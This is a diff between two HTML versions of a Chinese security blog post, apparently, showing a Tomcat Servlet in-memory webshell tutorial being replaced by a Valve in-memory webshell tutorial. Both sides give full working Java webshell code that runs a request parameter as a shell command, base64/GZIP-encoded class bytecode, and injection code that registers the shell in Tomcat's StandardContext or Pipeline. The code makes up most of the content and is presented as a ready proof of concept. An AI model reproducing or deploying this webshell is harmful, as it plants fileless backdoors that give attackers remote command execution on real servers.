@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <title>Tomcat之Servlet内存马 - P1n93r - 博学而精一</title>
+  <title>Tomcat之Valve内存马 - P1n93r - 博学而精一</title>
   <meta name="renderer" content="webkit" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 
@@ -16,7 +16,7 @@
 <meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
 
-<meta name="author" content="P1n93r" /><meta name="description" content="前置知识 Tomcat架构原理 Tomcat之Filter内存马 过程分析 前面文章中（Tomcat之Filter内存马），分析得到，我们可以通过S" /><meta name="keywords" content="SSM, Java, Web, Android" />
+<meta name="author" content="P1n93r" /><meta name="description" content="前置知识 需要掌握《Tomcat架构原理》。 这一招是真的厉害，脑袋一拍，我咋没想到？直接在Pipeline-Valve内植入木马，简单粗暴，非" /><meta name="keywords" content="SSM, Java, Web, Android" />
 
 
 
@@ -26,7 +26,7 @@
 <meta name="generator" content="Hugo 0.57.2 with theme even" />
 
 
-<link rel="canonical" href="https://p1n93r.github.io/post/security/tomcat%E4%B9%8Bservlet%E5%86%85%E5%AD%98%E9%A9%AC/" />
+<link rel="canonical" href="https://p1n93r.github.io/post/security/tomcat%E4%B9%8Bvalve%E5%86%85%E5%AD%98%E9%A9%AC/" />
 <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
@@ -38,26 +38,26 @@
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
 
 
-<meta property="og:title" content="Tomcat之Servlet内存马" />
-<meta property="og:description" content="前置知识 Tomcat架构原理 Tomcat之Filter内存马 过程分析 前面文章中（Tomcat之Filter内存马），分析得到，我们可以通过S" />
+<meta property="og:title" content="Tomcat之Valve内存马" />
+<meta property="og:description" content="前置知识 需要掌握《Tomcat架构原理》。 这一招是真的厉害，脑袋一拍，我咋没想到？直接在Pipeline-Valve内植入木马，简单粗暴，非" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://p1n93r.github.io/post/security/tomcat%E4%B9%8Bservlet%E5%86%85%E5%AD%98%E9%A9%AC/" />
-<meta property="article:published_time" content="2021-06-02T09:07:36+08:00" />
-<meta property="article:modified_time" content="2021-06-02T09:07:36+08:00" />
-<meta itemprop="name" content="Tomcat之Servlet内存马">
-<meta itemprop="description" content="前置知识 Tomcat架构原理 Tomcat之Filter内存马 过程分析 前面文章中（Tomcat之Filter内存马），分析得到，我们可以通过S">
+<meta property="og:url" content="https://p1n93r.github.io/post/security/tomcat%E4%B9%8Bvalve%E5%86%85%E5%AD%98%E9%A9%AC/" />
+<meta property="article:published_time" content="2021-06-02T15:46:36+08:00" />
+<meta property="article:modified_time" content="2021-06-02T15:46:36+08:00" />
+<meta itemprop="name" content="Tomcat之Valve内存马">
+<meta itemprop="description" content="前置知识 需要掌握《Tomcat架构原理》。 这一招是真的厉害，脑袋一拍，我咋没想到？直接在Pipeline-Valve内植入木马，简单粗暴，非">
 
 
-<meta itemprop="datePublished" content="2021-06-02T09:07:36&#43;08:00" />
-<meta itemprop="dateModified" content="2021-06-02T09:07:36&#43;08:00" />
-<meta itemprop="wordCount" content="1219">
+<meta itemprop="datePublished" content="2021-06-02T15:46:36&#43;08:00" />
+<meta itemprop="dateModified" content="2021-06-02T15:46:36&#43;08:00" />
+<meta itemprop="wordCount" content="516">
 
 
 
 <meta itemprop="keywords" content="" />
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Tomcat之Servlet内存马"/>
-<meta name="twitter:description" content="前置知识 Tomcat架构原理 Tomcat之Filter内存马 过程分析 前面文章中（Tomcat之Filter内存马），分析得到，我们可以通过S"/>
+<meta name="twitter:title" content="Tomcat之Valve内存马"/>
+<meta name="twitter:description" content="前置知识 需要掌握《Tomcat架构原理》。 这一招是真的厉害，脑袋一拍，我咋没想到？直接在Pipeline-Valve内植入木马，简单粗暴，非"/>
 
 <!--[if lte IE 9]>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
@@ -124,15 +124,15 @@
           <article class="post">
     
     <header class="post-header">
-      <h1 class="post-title">Tomcat之Servlet内存马</h1>
+      <h1 class="post-title">Tomcat之Valve内存马</h1>
 
       <div class="post-meta">
         <span class="post-time"> 2021-06-02 </span>
         <div class="post-category">
             <a href="/categories/security/"> security </a>
             </div>
-          <span class="more-meta"> 约 1219 字 </span>
-          <span class="more-meta"> 预计阅读 3 分钟 </span>
+          <span class="more-meta"> 约 516 字 </span>
+          <span class="more-meta"> 预计阅读 2 分钟 </span>
         <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
       </div>
     </header>
@@ -145,7 +145,7 @@
 <li>
 <ul>
 <li><a href="#前置知识">前置知识</a></li>
-<li><a href="#过程分析">过程分析</a></li>
+<li><a href="#poc构建">POC构建</a></li>
 </ul></li>
 </ul>
 </nav>
@@ -156,26 +156,13 @@
 
 <h2 id="前置知识">前置知识</h2>
 
-<ul>
-<li><a href="https://p1n93r.github.io/post/java/tomcat%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86/">Tomcat架构原理</a></li>
-<li><a href="https://p1n93r.github.io/post/security/tomcat%E4%B9%8Bfilter%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcat之Filter内存马</a></li>
-</ul>
+<p>需要掌握<a href="https://p1n93r.github.io/post/java/tomcat%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86/">《Tomcat架构原理》</a>。</p>
 
-<h2 id="过程分析">过程分析</h2>
+<p>这一招是真的厉害，脑袋一拍，我咋没想到？直接在Pipeline-Valve内植入木马，简单粗暴，非常好用。</p>
 
-<p>前面文章中（Tomcat之Filter内存马），分析得到，我们可以通过StandardContext动态添加一个Filter，那么我们是否可以同样通过StandardContext动态添加Servlet呢？</p>
+<h2 id="poc构建">POC构建</h2>
 
-<p>答案是肯定的。首先我们看到StandardContext.children属性，发现这个属性就是存储Wrapper的：</p>
-
-<p><img src="./../media/2021-06-02-01.png" alt="StandardContext.children" /></p>
-
-<p>然后看到StandardContext.servletMappings，是存储Servlet的访问路径的，如下所示：</p>
-
-<p><img src="./../media/2021-06-02-02.png" alt="StandardContext.servletMappings" /></p>
-
-<p>我们只需要将包含恶意Servlet的StandardWrapper添加到StandardContext.children中即可；幸运的是，StandardContext提供了开放的addChildren()方法可以添加Wrapper，同时最后不要忘记在StandardContext中添加Servlet的映射关系，StandardContext同时也提供了开放的addServletMappingDecoded()来添加Servlet的映射关系。这种方式比Filter内存马稍微简单一点，因为提供了开放的方法可以直接调用；当然，弊端也很明显，可能Servlet内存马会被登录过滤器拦截啥的，所以植入的Servlet内存马的访问路径得实地分析下。</p>
-
-<p>首先Servlet马的代码如下：</p>
+<p>首先创建一个Valve马，代码如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><span class="lnt"> 1
@@ -200,57 +187,33 @@
 </span><span class="lnt">20
 </span><span class="lnt">21
 </span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
 </span></pre></td>
 <td class="lntd">
-<pre class="chroma">public class CharEncodeServlet extends HttpServlet {
+<pre class="chroma">public class StandardContextsValve extends ValveBase {
     @Override
-    public void init(javax.servlet.ServletConfig servletConfig) {
-
-    }
-    @Override
-    public javax.servlet.ServletConfig getServletConfig() {
-        return null;
-    }
-    @Override
-    public void service(javax.servlet.ServletRequest servletRequest, javax.servlet.ServletResponse servletResponse) throws java.io.IOException {
-        String cmd = servletRequest.getParameter(&#34;p1n93r&#34;);
-        boolean isLinux = true;
-        String osTyp = System.getProperty(&#34;os.name&#34;);
-        if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)) {
-            isLinux = false;
+    public void invoke(Request request, Response response) throws IOException, ServletException {
+        HttpServletRequest req = (HttpServletRequest) request;
+        HttpServletResponse resp = (HttpServletResponse) response;
+        String cmd=req.getParameter(&#34;p1n93r&#34;);
+        if ( cmd!= null&amp;&amp;!&#34;&#34;.equals(cmd)) {
+            boolean isLinux = true;
+            String osTyp = System.getProperty(&#34;os.name&#34;);
+            if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)) {
+                isLinux = false;
+            }
+            String[] cmds = isLinux ? new String[]{&#34;sh&#34;, &#34;-c&#34;, cmd} : new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, cmd};
+            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+            Scanner s = new Scanner(in).useDelimiter(&#34;\\A&#34;);
+            String output = s.hasNext() ? s.next() : &#34;&#34;;
+            resp.getWriter().write(output);
+            resp.getWriter().flush();
         }
-        String[] cmds = isLinux ? new String[]{&#34;sh&#34;, &#34;-c&#34;, cmd} : new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, cmd};
-        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
-        java.util.Scanner s = new java.util.Scanner(in).useDelimiter(&#34;\\a&#34;);
-        String output = s.hasNext() ? s.next() : &#34;&#34;;
-        java.io.PrintWriter out = servletResponse.getWriter();
-        out.println(output);
-        out.flush();
-        out.close();
-    }
-    @Override
-    public String getServletInfo() {
-        return null;
-    }
-    @Override
-    public void destroy() {
+        this.getNext().invoke(request, response);
     }
 }</pre></td></tr></table>
 </div>
 </div>
-<p>然后将Servlet马的字节码压缩后base64存储：</p>
+<p>然后得到Valve马的压缩后的字节码：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><span class="lnt"> 1
@@ -267,7 +230,7 @@
 </span></pre></td>
 <td class="lntd">
 <pre class="chroma">public static void main(String[] args) throws IOException {
-    InputStream in = Test.class.getClassLoader().getResourceAsStream(&#34;CharEncodeServlet.class&#34;);
+    InputStream in = Test.class.getClassLoader().getResourceAsStream(&#34;StandardContextsValve.class&#34;);
     byte[] bytes = new byte[in.available()];
     in.read(bytes);
     // 将字节压缩下
@@ -279,7 +242,7 @@
 }</pre></td></tr></table>
 </div>
 </div>
-<p>最后给出完整的植入Servlet内存马的代码和过程：</p>
+<p>最后给出整体的POC：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><span class="lnt"> 1
@@ -305,21 +268,13 @@
 </span><span class="lnt">21
 </span><span class="lnt">22
 </span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
 </span></pre></td>
 <td class="lntd">
 <pre class="chroma">java.lang.ClassLoader classLoader = (java.lang.ClassLoader) Thread.currentThread().getContextClassLoader();
 java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod(&#34;defineClass&#34;,new Class[] {byte[].class, int.class, int.class});
 defineClass.setAccessible(true);
-// 这是经过GZIP压缩后的恶意Servlet的字节码
-String evalBase64 = &#34;H4sIAAAAAAAAAIVWW1cTVxT+Tkgyk8mAkAASENHaSpBLaq1Ug7VaxEINiIRiQXsZhgMZTWbizIRLb/Zuay8+tausvtQnX9uXqO1qH/vQH8XqPpMYEwiYtbJnzr7v/e19kv+2/vwHwMu4p6AbKRmTYUzhsoxpBVcwoyCEtIxZ8XxLwpyMqzLeljEvY0HBNVwX5B0F7+I9Ce8raIEmY1E8dUGWBOEylsNYQUaBgRuC3BQkKyEnwWQInjFMwz3L0BDvm2Pwj1pLnGFfyjD5VCG3yO1ZbTFLnEjK0rXsnGYb4lxm+t2M4TBEU6MZzR4zdbJNc3s1y90REgrHDIfiqRvaqraecEqSRFlj1DKXjZUREbTRqWYxdO9pwdA8yd2MtTSt2VqOu9ymFJpXuJuu9dIT73uGH0kIDJ0KObdLkjP8VoE77shuUidvmQ73imhyakwYDu7tkprs1LqhlJ8Rh1DSc0sCDKGXyGrmSiLt2obpVWM4hFphnYEtMAQsZ3YjTyiQgYDoWj0Tn0ET0FaSGFZiwswXXBJyLUdC5iHryQqukU2kdc00uU2SoFVwSZOysQR96mCa/LpXbcP11BrTrqbfnNTy3rTQ/Eo4JcGiUWVQxtZ1nncNKksCpdn0FL8Jc9liaC2jt73IJeqdbW2Qh7RVsHV+0RCD2L5jAIeEsYqD6KF888fN0ydsCbdU2KCyJMsZMml2JLgqCnBUrGKcylkzTBVroBY2b49NzXIyRAZ1MqeeDvF1iutL6BI2VHyAD1V8hI8lfKLiNj5laNnROJHMZ2RyndL6HF+o+BJfqfhaBIaEOyq+wbcS7qr4Dt+r+AE9Kn4U2bfsqI1mq3ZOMq6bT4wTqShE62Bazb1c6T/Dgb3mlEElaCqrxnA0vhOXulBVt3DDcTnFDwtXtpXntksIhl0rZa1xe1QTsy/rlulqhknwdFWHENWnRS6mTou28KSznmymYLpGjowVclw5tNWMTpktLiSCjNCLx+vsQrUFZahzxxmpCVVmlia1pqn7n4TbsUEd8boCcVuoBYdf4FkjZ3hN7d29qdt2T8pozhRfd70Lm7rhN71D954XB0OIsi4tZm3CtRsbrcOmkHlxyoqrol6aVE1gOVsQ2xHQs5bDcRgH6OdMfIJgYgWJHqJTgp407Agcewj2B734SLWkJFbgOaJqSQFH8Dw9GV7AUdISxic9few0DHuG7SVh2VC89SJOtE+4EwfBOob+cioD5VR87Pdt7pqq8vBV8hjAIBqEJbsLP4UE7vdHfI/R4MOUf9gf8T9CIBmIBf5FNBYoIhiRipA3EWwY9rf5N9ER/Buh+YaIkp73R8Lp+cBg+gHaykxVMBs9ZjL4CE2xYBH7imhOSn+hZT4mPUQkEi2iNSnH5CLaNhEWz/YHCET2J0MDj9HBkFRiSixURCymFNEpSJfoU4NXWJKKAiL0LyJKhbUSbaPGtlN/OjCHGHR0wkEX7hBu9wi5nwmzXwm136hg0Yx8qeBKb+9jyMNSvL2I49SmEH7BSzhB8VT8RP9nTlKTonR9DRMvQDEu4RWcogbrOIvTlI9E8YYwgjOQKWonXiW9EMWOkPw1KDhHvg8jsIW4hPOMvrErEl7fwhBRCaMSLpwnJsZIzU+JXPRgDvnIJygjAdgbGH8m1EfqQj1Rmdd+71xn5HqrDFnF8E1P69L/8zMrkdUJAAA=&#34;;
+// 这是经过GZIP压缩后的恶意Vavle的字节码
+String evalBase64 = &#34;H4sIAAAAAAAAAI1WWXMTRxD+RtesVwsGGdvIXHHCIRvwhkBIkAgJmDOxDbGIiYEc4/VgLUi7YndlG8hF7oOc5DKpykseqMpbqlICQoXwxEP+SP4FpGclQMaisKs8R/dM99fd3/Tq39t/3QCwBb/oWIVBDUNJHMQhDS/rSGJYQ17HYbyiNiMajqj5VY5RDUc1HNNwXMNrOl7HG2p4U4fAGIelow3jGqSaT6hhQg2FJGyc1HEKRTWUdKyEk4SLMsdpDo8hsd127GAHQzTTM8IQ63fHJUPrgO3IoUppTHqHxViRJKkB1xLFEeHZal8XxoKC7TN0DuQD4YwLb7zfdQI5Hfgjojgpc2TddibdU3RyODPgehOmKAurIE1LBKJoO8K0XMeRVuB65rA8XZF+kHvkMb/sOr7MKbDc9glnZZqBHWWIu/7hM2WF9KSYFGZROBNmPvBsZ4KAxKzSOCFtO9ZMGbEdhvaaxnbNA065EpBSihIpmbpW01UCu2jmLUFgPBWcWwnoJOHwauAZ1s0zSgbNq0fC8OjU1GOmIpEn5UXBmTZ96U0WZWAWgqBs7qchXxPc9xJTXpSHR12474ESxbCACmqdGhTlsNAhV3yOgKPCMUlc5OjjmCLaMeh7pi1ZDmy6zzHNcYZh0aAMCu74IeGJkgykRxnU827Fs+ReW9Gmqyld+hRGA4+hm1Jb3uRs2+yRPwNncY4BBt7C25Rq1+9zyCrHOwbexTkD7+E8oZ6yHQPv4wNy/mCBqb5+gYaNBJZTdH1ymjBETIvjQwMf4WMDn+BTjs8MfI4vGBbPqbUCdYGuHN9p4Et8ZeBrfGPgW5ynZBj4Dhc5vjfwA3408BO6DfyMGY5LBtYhQ7xqGizD6mZFn1Q63wyP7BKKHGvmRSiGtfPjEBmcF3fI4PwoQ4+jybtplB68RxCGlbON1m01HDAmZHCPNwQiM/e99jR7wgmCLYpEtPbGGwfHTlL4uZ6js2lxxg8kQUwqX55bll5ApE0G7oA7Jb3+MO1LMk3daJTRQNgOOVrW6Ki/ILy8ypxjydDd4vu64YoT2CWyqZO/e5v2WQ7qYvViiZ1E1EymSadqvEHALen7uVmu6kKGheRqVjk677qb09+WZpoqVH81Kr7cLYt2yQ6Lse7hxXigM/KC8IeI6+FXhbIRc8JNC6E64tWMNQI6RKbqilwDcxrE1N2n1OKB+t4FQVjjJ4oV9cw5+ai5XkEemj2Ku9+m9EOV6KbP5CqovwiY6kg0Pk47k2bqRYj3XgH7I1Q/QWMiFC7Caqg+FR7AGqylmakegKi6zP5DjLTAzfVDG7KxjanINUQjyMbT8Vv4LRVLx6uIX8JMbGsilbgKnuVpfgttaV6FlmqpQp9BIro10Z6YQTrxN5Kj0ZSRH42lFuRHyUT+Mjrq0oVK2lqTZrWrWJTWqlhcRSrbch1to+mWK1iSaq+iI6un9So6Z5BU89LLiKdi2WQ6dg1pyk6yiq76uoplvVUsX7/hGlZEoeKOhnHvophBvzIiWEIRt6MVHZS4TkrXUoo6jSy68ByWo4QV1MVXUntdhV8pnb/TiT/Jwj+UMZWzs5SXblxED3oplxlcwHpsAKd7+7ARfdDoRJaS/yRayEYvNuEp6GSpA5vpXFLltJ5vtdqCp8Ma3MRWPEPYIriBZ7GNMMdxnezkqA6tFMV2uhsnfMAgEndooXHs4Hie4wWOnRy7OPoZ/QNdwxy7b6tP3m6OPRx7Sdt/hwJNzL1B5vaFlIhgPw7gRVq3RAgTCI3iw0shawb+B6kuAzUECgAA&#34;;
 byte[] evalBytes = java.util.Base64.getDecoder().decode(evalBase64);
 java.io.ByteArrayInputStream byteInputStream = new java.io.ByteArrayInputStream(evalBytes);
 java.io.ByteArrayOutputStream byteOutputStream = new java.io.ByteArrayOutputStream();
@@ -329,36 +284,24 @@ for (int i=-1;(i=gzipInputStream.read(buffer)) &gt;0;){
     byteOutputStream.write(buffer,0,i);
 }
 byte[] bytes = byteOutputStream.toByteArray();
-// 先加载Servlet内存马类定义
+// 先加载Vavle内存马类定义
 defineClass.invoke(classLoader, new Object[] {bytes, 0, bytes.length});
-String servletName=&#34;charEncodeServlet&#34;;
-// 先获取StandardContext
 org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
 org.apache.catalina.webresources.StandardRoot standardroot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();
 org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext)standardroot.getContext();
-// 利用StandardContext创建StandardWrapper
-org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
-javax.servlet.http.HttpServlet evalServlet = (javax.servlet.http.HttpServlet) Class.forName(&#34;CharEncodeServlet&#34;).newInstance();
-// wrapper容器中放入servlet马
-wrapper.setServlet(evalServlet);
-wrapper.setName(servletName);
-// 往StandardContext中添加wrapper
-standardContext.addChild(wrapper);
-// 不要忘记在StandardContext中添加ServletMapping
-standardContext.addServletMappingDecoded(&#34;/p1n93r&#34;,servletName);</pre></td></tr></table>
+// 实例化Valve内存马
+org.apache.catalina.valves.ValveBase evalValve=(org.apache.catalina.valves.ValveBase)Class.forName(&#34;StandardContextsValve&#34;).newInstance();
+// 然后直接通过StandardContext获取当前容器的Pipeline，往里面添加Valve内存马即可
+standardContext.getPipeline().addValve(evalValve);</pre></td></tr></table>
 </div>
 </div>
-<p>最后的植入效果如下所示：</p>
+<p>内存中发现已经注入了Valve内存马：</p>
 
-<p><img src="./../media/2021-06-02-03.png" alt="Servlet内存马" /></p>
+<p><img src="./../media/2021-06-02-06.png" alt="Valve内存马" /></p>
 
-<p>查看StandardContext.children，如下所示：</p>
+<p>效果如下所示：</p>
 
-<p><img src="./../media/2021-06-02-04.png" alt="StandardContext.children" /></p>
-
-<p>查看StandardContext.servletMappings，如下所示：</p>
-
-<p><img src="./../media/2021-06-02-05.png" alt="StandardContext.servletMappings" /></p>
+<p><img src="./../media/2021-06-02-07.png" alt="Valve内存马效果" /></p>
 
     </div>
 
@@ -394,13 +337,9 @@ standardContext.addServletMappingDecoded(&#34;/p1n93r&#34;,servletName);</pre></
 </div><footer class="post-footer">
       
       <nav class="post-nav">
-        <a class="prev" href="/post/security/tomcat%E4%B9%8Bvalve%E5%86%85%E5%AD%98%E9%A9%AC/">
-            <i class="iconfont icon-left"></i>
-            <span class="prev-text nav-default">Tomcat之Valve内存马</span>
-            <span class="prev-text nav-mobile">上一篇</span>
-          </a>
-        <a class="next" href="/post/security/tomcat%E4%B9%8Bfilter%E5%86%85%E5%AD%98%E9%A9%AC/">
-            <span class="next-text nav-default">Tomcat之Filter内存马</span>
+        
+        <a class="next" href="/post/security/tomcat%E4%B9%8Bservlet%E5%86%85%E5%AD%98%E9%A9%AC/">
+            <span class="next-text nav-default">Tomcat之Servlet内存马</span>
             <span class="next-text nav-mobile">下一篇</span>
             <i class="iconfont icon-right"></i>
           </a>
